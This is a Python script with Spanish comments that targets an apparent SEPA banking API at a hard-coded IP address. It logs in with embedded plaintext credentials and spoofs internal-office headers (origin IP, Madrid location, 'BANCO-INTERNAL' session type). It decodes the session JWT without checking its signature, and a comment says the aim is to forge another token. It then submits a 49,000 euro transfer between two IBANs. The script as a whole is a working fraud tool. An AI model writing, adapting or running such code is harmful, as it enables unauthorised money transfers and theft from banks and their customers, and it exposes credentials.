import requests
import jwt

# URLs finales de la API SEPA
base_url = "http://80.78.30.242:9181"

login_url = f"{base_url}/api/login/"
transfer_url = f"{base_url}/api/send-transfer"
verify_url = f"{base_url}/api/transferencia/verify/"

# Datos del backend desde el código interno que me diste
headers = {
    "Host": "api.coretransapi.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/html;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.8,en;q=0.5",
    "Content-Type": "application/json",
    "Authorization": "Bearer dummy_token_here",  # Esto se llenará si lo capturamos del login
    "X-Origin-IP": "192.168.1.10",
    "X-Geo-Location": "40.4074,3.6915",       # Coordenadas de Madrid
    "X-Location": "OFICINA-ES-MADRID-9181",
    "X-Session-ID": "",
    "X-Session-Type": "BANCO-INTERNAL",
    "X-Requested-With": "XMLHttpRequest",
    "X-CSRFToken": ""
}

session = requests.Session()
session.headers.update(headers)

# Paso 1 | Iniciar sesión con token interno
login_response = session.post(login_url, json={
    "username": "markmur88",
    "password": "Ptf8454Jd55"
})

if login_response.status_code == 200:
    print("[+] Sesión generada.")
    token = login_response.json().get("access_token")  # Este es Bearer JWT
    session.headers.update({"Authorization": f"Bearer {token}"})

    # Si el token no expira rápido, lo usamos como firma persistente
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print("Issuer:", decoded.get("iss"))  # Emisor del token (para falsificar otro)
        print("User ID:", decoded.get("user_id"))  # Ver quién está atrás del token
    except Exception as e:
        print("No pude decodificar el token JWT. Tal vez es encriptado con llave local.")

    # Paso 2 | Enviar transferencia SEPA ya con el token
    transferencia = {
        "iban_origen": "ES8000180001234567890123",
        "iban_destino": "ES9100289392790001457822",
        "monto": 49000,
        "reason": "PAGO-CLIENTE-INT",
        "timestamp": "2025-07-05T14:30:00Z"
    }

    send_xfer = session.post(transfer_url, json=transferencia)
    print("[+] Resultado de transferencia SEPA", send_xfer.status_code)
    print(send_xfer.text)

else:
    print("[-] Problema al iniciar sesión. Respuesta:", login_response.text)
    print("Status:", login_response.status_code)